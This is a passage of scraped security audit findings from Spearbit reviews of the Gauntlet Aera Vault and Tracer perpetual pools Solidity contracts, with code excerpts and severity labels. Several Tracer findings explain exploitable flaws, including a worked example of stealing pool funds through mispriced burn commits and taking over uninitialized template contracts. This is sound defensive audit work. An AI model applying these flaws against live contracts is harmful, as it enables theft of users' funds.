"https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The disableTrading() function can also be called by managers because of the onlyOwnerOrMan- agermodifier. However in AeraVaultV1.sol it is located in the PROTOCOL API section. It is also not present in IManagerAPI.sol. contract AeraVaultV1 is IAeraVaultV1, Ownable, ReentrancyGuard { /// PROTOCOL API /// function disableTrading() ... onlyOwnerOrManager ... { ... } /// MANAGER API /// } interface IManagerAPI { function updateWeightsGradually(...) external; function cancelWeightUpdates() external; function setSwapFee(uint256 newSwapFee) external; function claimManagerFees() external; } // disableTrading() isn't present 30", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Doublecheck layout functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Different ways are used to layout functions. Especially the part between ( ... ) and between ) ... { is sometimes done on one line and sometimes split in multiple lines. Also { is sometimes at the end of a line and sometimes at the beginning. Although the layout is not disturbing it might be useful to doublecheck it. Here are a few examples of different layouts: function updateWeights(uint256[] memory weights, uint256 weightSum) internal ... { } function depositToken(IERC20 token, uint256 amount) internal { ... } function updatePoolBalance( uint256[] memory amounts, IBVault.PoolBalanceOpKind kind ) internal { ... } function updateWeights(uint256[] memory weights, uint256 weightSum) internal ... { } function updateWeightsGradually( uint256[] calldata targetWeights, uint256 startTime, uint256 endTime ) external override onlyManager whenInitialized whenNotFinalizing { ... } function getWeightChangeRatio(uint256 weight, uint256 targetWeight) internal pure returns (uint256) { } ...", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Use Math library functions in a consistent way", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "In the AeraVaultV1 contract, the OZs Math library functions are attached to the type uint256. The min function is used as a member function whereas the max function is used as a library function.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Separation of concerns Owner and Manager", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The Owner and Manager roles are separated on purpose. Role separation usually helps to improve quality. However this separation can be broken if the Owner calls setManager(). This way the Owner can set the Manager to one of his own addresses, do Manager functions (for example setSwapFee()) and perhaps set it back to the Manager. Note: as everything happens on chain these actions can be tracked. function setManager(address newManager) external override onlyOwner { if (newManager == address(0)) { revert Aera__ManagerIsZeroAddress(); } if (initialized && noticeTimeoutAt == 0) { calculateAndDistributeManagerFees(); } emit ManagerChanged(manager, newManager); manager = newManager; }", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Add modifier whenInitialized to function finalize()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The function finalize() does not have the modifier whenInitialized while most other functions have this modifier. This does not create any real issues because the function contains the check noticeTimeoutAt == 0 which can only be skipped after initiateFinalization(), and this function does have the whenInitialized modifier. function finalize() external override nonReentrant onlyOwner { // no modifier whenInitialized if (noticeTimeoutAt == 0) { // can only be set via initiateFinalization() revert Aera__FinalizationNotInitialized(); } ... }", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Document the use of mustAllowlistLPs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "In the Mannon Vault it is important that no other accounts can use joinPool() on the balancer pool. If other accounts are able to call joinPool(), they would get Balancer Pool Tokens (BPT) which could rise in value once more funds are added to the pool. Luckily this is prevented by the mustAllowlistLPs parameter in NewPoolParams. Readers could easily overlook this parameter. pool = IBManagedPool( IBManagedPoolFactory(factory).create( IBManagedPoolFactory.NewPoolParams({ vault: IBVault(address(0)), name: name, symbol: symbol, tokens: tokens, normalizedWeights: weights, assetManagers: managers, swapFeePercentage: swapFeePercentage, pauseWindowDuration: 0, bufferPeriodDuration: 0, owner: address(this), swapEnabledOnStart: false, mustAllowlistLPs: true, managementSwapFeePercentage: 0 // prevent other account to use joinPool }) ) );", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "finalize can be called multiple times", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The finalize function can be called multiple time, leading to the possibility to waste gas for no reason and emitting again a conceptually wrong Finalized event. Currently, theres no check that will prevent to call the function multiple time and there is no explicit flag to allow external sources (web app, external contract) to know whether the AeraVault has been finalized or not. Scenario: the AeraVault has already been finalized but the owner (that could be a contract and not a single EOA) is not aware of it. He calls finalize again and wastes gas because of the external calls in a loop done in returnFunds and emit an additional event Finalized(owner(), [0, 0, ..., 0]) with an array of zeros in the amounts event parameter.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Consider updating finalize to have a more \"clean\" final state for the AeraVault/Balancer pool", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "This is just a suggestion and not an issue per se. The finalize function should ensure that the pool is in a finalized state for both a better UX and DX. Currently, the finalize function is only withdrawing all the funds from the pool after a noticePeriod but is not ensuring that the swap have been disabled and that all the rewards, entitled to the Vault (owned by the Treasury), have been claimed.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "enableTradingWithWeights is not emitting an event for pools weight change", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "enableTradingWithWeights is both changing the pools weight and enabling the swap feature, but its only emitting the swap related event (done by calling setSwapEnabled). Both of those operations should be correctly tracked via events to be monitored by external tools.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Document Balancer checks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Balancer has a large number of internal checks. Weve discussed the use of additional checks in the Aera Vault functions. The advantage of this is that it could result in more user friendly error messages. Additionally it protects against potential future change in the Balancer code. contract AeraVaultV1 is IAeraVaultV1, Ownable, ReentrancyGuard { function enableTradingWithWeights(uint256[] calldata weights) ... { { ... // doesn't check weights.length pool.updateWeightsGradually(timestamp, timestamp, weights); ... } } Balancer code: function updateWeightsGradually( ..., uint256[] memory endWeights) ... { (IERC20[] memory tokens, , ) = getVault().getPoolTokens(getPoolId()); ... InputHelpers.ensureInputLengthMatch(tokens.length, endWeights.length); // length check is here ... }", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Rename FinalizationInitialized to FinalizationInitiated for code consistency", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The function at L517 was renamed from initializeFinalization to initiateFinalization to avoid confusion with the Aera vault initialization. For code consistency, the corresponding event and error names should be changed.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Consider enforcing an explicit check on token order to avoid human error", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The Balancer protocol require (and enforce during the pool creation) that the pools token must be ordered by the token address. The following functions accept an uint256[] of amounts or weights without knowing if the order inside that array follow the same order of the tokens inside the Balancer pool.  initialDeposit  deposit  withdraw  enableTradingWithWeights  updateWeightsGradually While its impossible to totally prevent the human error (they could specify the correct token order but wrongly swap the input order of the amount/weight) we could force the user to be more aware of the specific order in which the amounts/weights must be specified. A possible solution applied to the initialDeposit as an example could be: 37 function initialDeposit(IERC20[] calldata tokensSorted, uint256[] calldata amounts) external override onlyOwner { // ... other code IERC20[] memory tokens = getTokens(); // check that also the tokensSorted length match the lenght of other arrays if (tokens.length != amounts.length || tokens.length != tokensSorted.length) { revert Aera__AmountLengthIsNotSame( tokens.length, amounts.length ); } // ... other code for (uint256 i = 0; i < tokens.length; i++) { // check that the token position associated to the amount has the same position of the one in ,! the balancer pool if( address(tokens[i]) != address(tokensSorted[i]) ) { revert Aera__TokenOrderIsNotSame( address(tokens[i]), address(tokensSorted[i]), i ); } depositToken(tokens[i], amounts[i]); } // ... other code } Another possible implementation would be to introduce a custom struct struct TokenAmount { IERC20 token; uint256 value; } Update the function signature function initialDeposit(TokenAmount[] calldata tokenWithAmount) and up- date the example code following the new parameter model. Its important to note that while this solution will not completely prevent the human error, it will increase the gas consumption of each function.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Swap is not enabled after initialDeposit execution", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "In the current deployment flow of the AeraVault the Balancer pool is created (by the constructor) with swapEnabledOnStart set as false. When the pool receives their initial funds via initialDeposit the pool has still the swap functionality disabled. It is not explicitly clear in the specification document and in the code when the swap functionality should be enabled. If the protocol wants to enable the swap as soon as the funds are deposited in the pool, they should call, after bVault.joinPool(...), setSwapEnabled(true) or enableTradingWithWeights(uint256[] calldata weights) in case the external spot price is not aligned (both functions will also trigger a SetSwapEnabled event)", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Remove commented code and replace input values with Balancer enum", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Inside initialDeposit function, there is some commented code (used as example) that should be removed for clarity and future confusion. The initUserData should not use direct input values (0 in this case) but use the correct Balancers enum value to avoid any possible confusion. Following the Balancer documentation  Encoding userData  JoinKind The correct way to declare initUserData is using the WeightedPoolUserData.JoinKind.INIT enum value.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "The Created event is not including all the information used to deploy the Balancer pool and are missing indexed properties", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The current Created event is defined as 39 event Created( address indexed factory, IERC20[] tokens, uint256[] weights, address manager, address validator, uint32 noticePeriod, string description ); And is missing some of the information that are used to deploy the pool. To allow external tools to better monitor the deployment of the pools, it should be better to include all the information that have been used to deploy the pool on Balancer. The following information is currently missing from the event definition:  name  symbol  managementFee  swapFeePercentage The event could also define both manager and validator as indexed event parameters to allow external tools to filter those events by those values.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Rename temp variable managers to assetManagers to avoid confusions and any potential future mistakes", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The managers declared in the linked code (see context) are in reality Asset Manager that have a totally different role compared to the AeraVault Manager role. The AssetManager is able to control the pools balance, withdrawing from it or depositing into it. To avoid confusion and any potential future mistakes, it should be better to rename the temporary variable managers to a more appropriate name like assetManagers. - address[] memory managers = new address[](tokens.length); + address[] memory assetManagers = new address[](tokens.length); for (uint256 i = 0; i < tokens.length; i++) { - + } managers[i] = address(this); assetManagers[i] = address(this); pool = IBManagedPool( IBManagedPoolFactory(factory).create( - + IBManagedPoolFactory.NewPoolParams({ vault: IBVault(address(0)), name: name, symbol: symbol, tokens: tokens, normalizedWeights: weights, assetManagers: managers, assetManagers: assetManagers, swapFeePercentage: swapFeePercentage, pauseWindowDuration: 0, bufferPeriodDuration: 0, owner: address(this), swapEnabledOnStart: false, mustAllowlistLPs: true, managementSwapFeePercentage: 0 }) ) ); 41", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Move description declaration inside the storage slot code block", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "In the current code, the description state variable is in the block of /// STORAGE /// where all the immutable variable are re-grouped. As the dev comment say, string cannot be immutable bytecode but only set in constructor so it would be better to move it inside the /// STORAGE SLOT START /// block of variables that regroup all the non-constant and non-immutable state variables.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Remove unused imports from code", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The current implementation of the AeraVaultV1 contract is importing OpenZeppelin IERC165 inter- face, but that interface is never used or references in the code.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "shortfall is repeated twice in IWithdrawalValidator natspec comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The word shortfall is repeated twice in the natspec comment.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Provide definition of weights & managementFee_ in the NatSpec comment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The NatSpec Format is special form of comments to provide rich documentation for functions, return variables and more. We observed an occurrence where the NatSpec comments are missing for two of the user inputs (weights & managementFee_).", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Pool token price is incorrect when there is more than one pending upkeep", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The amount of pool tokens to mint and quote tokens to burn is determined by the pool token price. This price, for a commit at update interval ID X, should not be influenced by any pending commits for IDs greater than X. However, in the current implementation price includes the current total supply but burn commits burn pool tokens immediately when commit() is called, not when upkeep() is executed. // pool token price computation at execution of updateIntervalId, example for long price priceHistory[updateIntervalId].longPrice = longBalance / (IERC20(tokens[LONG_INDEX]).totalSupply() + _totalCommit[updateIntervalId].longBurnAmount + _totalCommit[updateIntervalId].longBurnShortMintAmount) ,! The implementation tries to fix this by adding back all tokens burned at this updateIntervalId but it must also add back all tokens that were burned in future commits (i.e. when ID > updateIntervalID). This issue allows an attacker to get a better pool token price and steal pool token funds. Example: Given the preconditions:  long.totalSupply() = 2000  User owns 1000 long pool tokens  lastPriceTimestamp = 100  updateInterval = 10  frontRunningInterval = 5 At time 104: User commits to BurnLong 500 tokens in appropriateUpdateIntervalId = 5. Upon execution user receives a long price of longBalance / (1500 + 500) if no further future commitments are made. Then, as tokens are burned totalPoolCommitments[5].longBurnAmount = 500 and long.totalSupply -= 500. time 106: At 6 as they are now past totalPoolCommitments[6].longBurnAmount = 500, long.totalSupply -= 500 again as tokens are burned. User commits another 500 tokens to BurnLong at appropriateUpdateIntervalId = Now the frontRunningInterval and are scheduled for the next update. the 5th update interval Finally, (IERC20(tokens[LONG_INDEX]).totalSupply() + _totalCommit[5].longBurnAmount + _totalCom- mit[5].longBurnShortMintAmount = longBalance / (1000 + 500) which is a better price than what the user should have received. ID is executed by the pool keeper but at longPrice = longBalance / With a longBalance of 2000, the user receives 500 * (2000 / 1500) = 666.67 tokens executing the first burn commit and 500 * ((2000 - 666.67) / 1500) = 444.43 tokens executing the second one. 5 The total pool balance received by the user is 1111.1/2000 = 55.555% by burning only 1000 / 2000 = 50% of the pool token supply.", "labels": ["Spearbit", "Tracer", "Severity: Critical"]}, {"title": "No price scaling in SMAOracle", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The update() function of the SMAOracle contract doesnt scale the latestPrice although a scaler is set in the constructor. On the other hand, the _latestRoundData() function of ChainlinkOracleWrapper contract does scale via toWad(). contract SMAOracle is IOracleWrapper { constructor(..., uint256 _spotDecimals, ...) { ... require(_spotDecimals <= MAX_DECIMALS, \"SMA: Decimal precision too high\"); ... /* `scaler` is always <= 10^18 and >= 1 so this cast is safe */ scaler = int256(10**(MAX_DECIMALS - _spotDecimals)); ... } function update() internal returns (int256) { /* query the underlying spot price oracle */ IOracleWrapper spotOracle = IOracleWrapper(oracle); int256 latestPrice = spotOracle.getPrice(); ... priceObserver.add(latestPrice); // doesn't scale latestPrice ... } contract ChainlinkOracleWrapper is IOracleWrapper { function getPrice() external view override returns (int256) { (int256 _price, ) = _latestRoundData(); return _price; } function _latestRoundData() internal view returns (int256, uint80) { (..., int256 price, ..) = AggregatorV2V3Interface(oracle).latestRoundData(); ... return (toWad(price), ...); }", "labels": ["Spearbit", "Tracer", "Severity: High Risk"]}, {"title": "Two different invariantCheck variables used in PoolFactory.deployPool()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The deployPool() function in the PoolFactory contract uses two different invariantCheck vari- ables: the one defined as a contracts instance variable and the one supplied as a parameter. Note: This was also documented in Secureums CARE-X report issue \"Invariant check incorrectly fixed\". function deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) { ... poolCommitter.initialize(..., ,! invariantCheck deploymentParameters.invariantCheck, ... ); // version 1 of ... ILeveragedPool.Initialization memory initialization = ILeveragedPool.Initialization({ ... _invariantCheckContract: invariantCheck, // version 2 of invariantCheck ... });", "labels": ["Spearbit", "Tracer", "Severity: High Risk"]}, {"title": "Duplicate user payments for long commits when paid from balance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "When minting pool tokens in commit(), the fromAggregateBalance parameter indicates if the user wants to pay from their internal balances or by transferring the tokens. The second if condition is wrong and leads to users having to pay twice when calling commit() with CommitType.LongMint and fromAggregateBalance = true.", "labels": ["Spearbit", "Tracer", "Severity: High Risk"]}, {"title": "Initial executionPrice is too high", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "When a pool is deployed the initial executionPrice is calculated as firstPrice * 1e18 where firstPrice is ILeveragedPool(_poolAddress).getOraclePrice(): contract PoolKeeper is IPoolKeeper, Ownable { function newPool(address _poolAddress) external override onlyFactory { int256 firstPrice = ILeveragedPool(_poolAddress).getOraclePrice(); int256 startingPrice = ABDKMathQuad.toInt(ABDKMathQuad.mul(ABDKMathQuad.fromInt(firstPrice), ,! FIXED_POINT)); executionPrice[_poolAddress] = startingPrice; } } All other updates to executionPrice use the result of getPriceAndMetadata() directly without scaling: function performUpkeepSinglePool() { ... (int256 latestPrice, ...) = pool.getUpkeepInformation(); ... executionPrice[_pool] = latestPrice; ... } contract LeveragedPool is ILeveragedPool, Initializable, IPausable { function getUpkeepInformation() { (int256 _latestPrice, ...) = IOracleWrapper(oracleWrapper).getPriceAndMetadata(); return (_latestPrice, ...); } } The price after the firstPrice will always be lower, therefore its funding rate payment will always go to the shorts and long pool token holders will incur a loss.", "labels": ["Spearbit", "Tracer", "Severity: High Risk"]}, {"title": "Paused state cant be set and therefore withdrawQuote() cant be executed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The checkInvariants() function of the InvariantCheck contract is called via the modifiers check- InvariantsBeforeFunction() and checkInvariantsAfterFunction() of both LeveragedPool and PoolCommit- ter contracts, and it is meant to pause the contracts if the invariant checks dont hold. The aforementioned modifiers also contain the require(!paused, \"Pool is paused\"); statement, which reverts the entire transaction and resets the paused variable that was just set. Furthermore, the paused state can only be set by the InvariantCheck contract due to the onlyInvariantCheck- Contract modifier. Thus the paused variable will never be set to true, making withdrawQuote() impossible to be executed because it requires the contract to be paused. This means that the quote tokens will always stay in the pool even if invariants dont hold and all other actions are blocked. Relevant parts of the code: The checkInvariants() function calls InvariantCheck.pause() if the invariants dont hold. The latter calls pause() in LeveragedPool and PoolCommitter: contract InvariantCheck is IInvariantCheck { function checkInvariants(address poolToCheck) external override { ... pause(IPausable(poolToCheck), IPausable(address(poolCommitter))); ... } function pause(IPausable pool, IPausable poolCommitter) internal { pool.pause(); poolCommitter.pause(); } } In LeveragedPool and PoolCommitter contracts, the checkInvariantsBeforeFunction() and checkIn- variantsAfterFunction() modifiers will make the transaction revert if checkInvariants() sets the paused state. contract LeveragedPool is ILeveragedPool, Initializable, IPausable { modifier checkInvariantsBeforeFunction() { invariantCheck.checkInvariants(address(this)); // can set paused to true require(!paused, \"Pool is paused\"); // will reset pause again _; } modifier checkInvariantsAfterFunction() { require(!paused, \"Pool is paused\"); _; invariantCheck.checkInvariants(address(this)); // can set paused to true require(!paused, \"Pool is paused\"); // will reset pause again } function pause() external override onlyInvariantCheckContract { // can only called from InvariantCheck paused = true; emit Paused(); } ,! } 9 contract PoolCommitter is IPoolCommitter, Initializable { modifier checkInvariantsBeforeFunction() { invariantCheck.checkInvariants(leveragedPool); // can set paused to true require(!paused, \"Pool is paused\"); // will reset pause again _; } modifier checkInvariantsAfterFunction() { require(!paused, \"Pool is paused\"); _; invariantCheck.checkInvariants(leveragedPool); // can set paused to true require(!paused, \"Pool is paused\"); // will reset pause again } function pause() external onlyInvariantCheckContract { // can only called from InvariantCheck paused = true; emit Paused(); }", "labels": ["Spearbit", "Tracer", "Severity: High Risk"]}, {"title": "The value of lastExecutionPrice fails to update if pool.poolUpkeep() reverts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The performUpkeepSinglePool() function of the PoolKeeper contract updates executionPrice[] with the latest price and calls pool.poolUpkeep() to process the price difference. However, pool.poolUpkeep() can revert, for example due to the checkInvariantsBeforeFunction modifier in mintTokens(). If pool.poolUpkeep() reverts then the previous price value is lost and the processing will not be accurate. There- fore, it is safer to store the new price only if pool.poolUpkeep() has been executed succesfully. function performUpkeepSinglePool(...) public override { ... int256 lastExecutionPrice = executionPrice[_pool]; executionPrice[_pool] = latestPrice; ... try pool.poolUpkeep(lastExecutionPrice, latestPrice, _boundedIntervals, _numberOfIntervals) { // previous price can get lost if poolUpkeep() reverts ... // executionPrice[_pool] should be updated here } catch Error(string memory reason) { ... } }", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "Pools can be deployed with malicious or incorrect quote tokens and oracles", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The deployment of a pool via deployPool() is permissionless. The deployer provides several pa- rameters that have to be trusted by the users of a specific pool, these parameters include:  oracleWrapper  settlementEthOracle  quoteToken  invariantCheck If any one of them is malicious, then the pool and its value will be affected. Note: Separate findings are made for the deployer check (issue Authenticity check for oracles is not effective) and the invariantCheck (issue Two different invariantCheck variables used in PoolFactory.deployPool() ).", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "pairTokenBase and poolBase template contracts instances are not initialized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The constructor of PoolFactory contract creates three template contract instances but only one is initialized: poolCommitterBase. The other two contract instances (pairTokenBase and poolBase) are not initial- ized. contract PoolFactory is IPoolFactory, Ownable { constructor(address _feeReceiver) { ... PoolToken pairTokenBase = new PoolToken(DEFAULT_NUM_DECIMALS); // not initialized pairTokenBaseAddress = address(pairTokenBase); LeveragedPool poolBase = new LeveragedPool(); // not initialized poolBaseAddress = address(poolBase); PoolCommitter poolCommitterBase = new PoolCommitter(); // is initialized poolCommitterBaseAddress = address(poolCommitterBase); ... /* initialise base PoolCommitter template (with dummy values) */ poolCommitterBase.initialize(address(this), address(this), address(this), owner(), 0, 0, 0); } This means an attacker can initialize the templates setting them as the owner, and perform owner actions on contracts such as minting tokens. This can be misleading for users of the protocol as these minted tokens seem to be valid tokens. In PoolToken.initialize() an attacker can become the owner by calling initialize() with an address under his control as a parameter. The same can happen in LeveragedPool.initialize() with the initialization parameter. 13 contract PoolToken is ERC20_Cloneable, IPoolToken { ... } contract ERC20_Cloneable is ERC20, Initializable { function initialize(address _pool, ) external initializer { // not called for the template contract owner = _pool; ... } } contract LeveragedPool is ILeveragedPool, Initializable, IPausable { function initialize(ILeveragedPool.Initialization calldata initialization) external override initializer { ,! // not called for the template contract ... // set the owner of the pool. This is governance when deployed from the factory governance = initialization._owner; } }", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "Oracles are not updated before use", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The PoolKeeper contract uses two oracles but does not ensure that their prices are updated. The poll() function should be called on both oracles to get the first execution and the settlement / ETH prices. As it currently is, the code could operate on old data.", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "getPendingCommits() underreports commits", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "When frontRunningInterval > updateInterval, the PoolCommitter.getAppropriateUpdateIntervalId() function can return updateInterval IDs that are arbitrarily far into the future, especially if appropriateIntervalId > updateIntervalId + 1. Therefore, commits can also be made to these appropriate interval IDs far in the future by calling commit(). The PoolCommitter.getPendingCommits() function only checks the commits for updateIntervalId and updateIn- tervalId + 1, but needs to check up to updateIntervalId + factorDifference + 1. Currently, it is underreporting the pending commits which leads to the checkInvariants function not checking the correct values.", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "Authenticity check for oracles is not effective", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The deployPool() function verifies the authenticity of the oracleWrapper by calling its deployer() function. As the oracleWrapper is supplied via deploymentParameters, it can be a malicious contract whose deployer() function can return any value, including msg.sender. Note: this check does protect against frontrunning the deployment transaction of the same pool. See Undocu- mented frontrunning protection. function deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) { ... require(IOracleWrapper(deploymentParameters.oracleWrapper).deployer() == msg.sender, \"Deployer must be oracle wrapper owner\");", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "Incorrect calculation of keeper reward", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The keeper reward is calculated as (keeperGas * tipPercent / 100) / 1e18. The division by 1e18 is incorrect and undervalues the reward for the keeper. The tip part of the keeper reward is essentially ignored. The likely cause of this miscalculation is based on the note at PoolKeeper.sol#244 which states the tip percent is in WAD units, but it really is a quad representation of a value in the range between 5 and 100. The comment at PoolKeeper.sol#L241 also incorrectly states that _keeperGas is in wei (usually referring to ETH), which is not the case as it is denominated in the quote token, but in WAD precision.", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "performUpkeepSinglePool() can result in a griefing attack when the pool has not been updated for many intervals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Assuming the pool has not been updated for many update intervals, performUpkeepSinglePool() can call poolUpkeep() repeatedly with _boundedIntervals == true and a bounded amount of gas to fix this situation. This in turn will call executeCommitments() repeatedly. For each call to executeCommitments() the updateMintingFee() function will be called. This updates fees and changes them in an unexpected way. A griefing attack is possible by repeatedly calling executeCommitments() with boundedIntervals == true and numberOfIntervals == 0. Note: Also see issue It is not possible to call executeCommitments() for multiple old commits. It is also important that lastPriceTimestamp is only updated after the last executeCommitments(), otherwise it will revert. 17 function executeCommitments(bool boundedIntervals, uint256 numberOfIntervals) external override ,! onlyPool { ... uint256 upperBound = boundedIntervals ? numberOfIntervals : type(uint256).max; ... while (i < upperBound) { if (block.timestamp >= lastPriceTimestamp + updateInterval * counter) { // ,! lastPriceTimestamp shouldn't be updated too soon ... } } ... updateMintingFee(); // should do this once (in combination with _boundedIntervals==true) ... }", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "It is not possible to call executeCommitments() for multiple old commits", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Assuming the pool has not been updated for many update intervals, performUpkeepSinglePool() can call poolUpkeep() repeatedly with _boundedIntervals == true and a bounded amount of gas to fix this situation. In this context the following problem occurs:  In the first run of poolUpkeep(), lastPriceTimestamp will be set to block.timestamp.  In the next run of poolUpkeep(), processing will stop at require(intervalPassed(),..), because block.timestamp hasnt increased. This means the rest of the commitments wont be executed by executeCommitments() and updateIntervalId, which is updated in executeCommitments(), will start lagging. 18 function poolUpkeep(..., bool _boundedIntervals, uint256 _numberOfIntervals) external override ,! onlyKeeper { require(intervalPassed(), \"Update interval hasn't passed\"); // next time lastPriceTimestamp == ,! block.timestamp executePriceChange(_oldPrice, _newPrice); // should only to this once (in combination with ,! _boundedIntervals==true) IPoolCommitter(poolCommitter).executeCommitments(_boundedIntervals, _numberOfIntervals); lastPriceTimestamp = block.timestamp; // shouldn't update until all executeCommitments() are ,! processed } function intervalPassed() public view override returns (bool) { unchecked { return block.timestamp >= lastPriceTimestamp + updateInterval; } } }", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "Incorrect comparison in getUpdatedAggregateBalance()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "When the value of data.updateIntervalId accidentally happens to be larger data.currentUpdateIntervalId in the getUpdatedAggregateBalance() function, it will execute the rest of the function, which shouldnt happen. Although this is unlikely it is also very easy to prevent. function getUpdatedAggregateBalance(UpdateData calldata data) external pure returns (...) { if (data.updateIntervalId == data.currentUpdateIntervalId) { // Update interval has not passed: No change return (0, 0, 0, 0, 0); } }", "labels": ["Spearbit", "Tracer", "Severity: Low Risk"]}, {"title": "updateAggregateBalance() can run out of gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The updateAggregateBalance() function of the PoolCommitter contract contains a for loop that, in theory, could use up all the gas and result in a revert. The updateAggregateBalance() function checks all future intervals every time it is called and adds them back to the unAggregatedCommitments array, which is checked in the next function call. This would only be a problem if frontRunningInterval is much larger than updateInterval, a situation that seems unlikely in practice. function updateAggregateBalance(address user) public override checkInvariantsAfterFunction { ... uint256[] memory currentIntervalIds = unAggregatedCommitments[user]; uint256 unAggregatedLength = currentIntervalIds.length; for (uint256 i = 0; i < unAggregatedLength; i++) { uint256 id = currentIntervalIds[i]; ... UserCommitment memory commitment = userCommitments[user][id]; ... if (commitment.updateIntervalId < updateIntervalId) { ... } else { ... 